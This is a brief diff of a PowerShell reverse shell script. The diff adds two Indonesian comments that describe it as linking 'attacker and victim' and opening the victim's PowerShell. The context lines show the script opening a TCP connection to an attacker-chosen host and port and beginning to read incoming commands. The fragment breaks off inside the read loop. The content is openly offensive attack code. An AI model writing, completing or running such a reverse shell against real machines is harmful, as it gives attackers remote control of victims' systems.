@@ -8,6 +8,7 @@ if (-not $l -or -not $p) {
     exit
 }
 
+#Perintah untuk koneksi antar attacker dan victim
 $client = New-Object System.Net.Sockets.TCPClient($l, $p)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
@@ -15,6 +16,7 @@ $writer.AutoFlush = $true
 $buffer = New-Object System.Byte[] 1024
 $encoding = New-Object System.Text.ASCIIEncoding
 
+#Sintaks untuk membuka powershell victim
 try {
     while ($true) {
         $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
